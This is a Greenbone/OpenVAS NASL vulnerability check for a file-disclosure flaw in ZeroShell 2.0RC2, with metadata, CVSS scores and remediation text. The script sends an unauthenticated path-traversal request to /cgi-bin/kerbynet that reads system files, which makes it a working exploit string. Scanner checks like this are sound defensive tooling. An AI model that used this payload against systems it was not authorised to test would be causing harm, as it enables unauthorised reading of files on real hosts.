if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103761" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-08-14 10:33:56 +0200 (Wed, 14 Aug 2013)" );
	script_name( "ZeroShell 2.0RC2 File Disclosure / Command Execution" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 443 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122799/ZeroShell-2.0RC2-File-Disclosure-Command-Execution.html" );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view files or execute
  arbitrary script code in the context of the web server process. This may aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a GET request, try to include a local file and check the response." );
	script_tag( name: "insight", value: "Input to the 'Object' value in /cgi-bin/kerbynet is not properly sanitized." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "ZeroShell is prone to a local file-include vulnerability because it
  fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "affected", value: "ZeroShell version 2.0RC2 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 443 );
buf = http_get_cache( item: "/", port: port );
if(!buf || ( !ContainsString( buf, "<title>ZeroShell" ) && !ContainsString( buf, "/cgi-bin/kerbynet" ) )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../" + file;
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req );
	if(match = egrep( string: buf, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		report += "\nResponse:       " + chomp( match );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

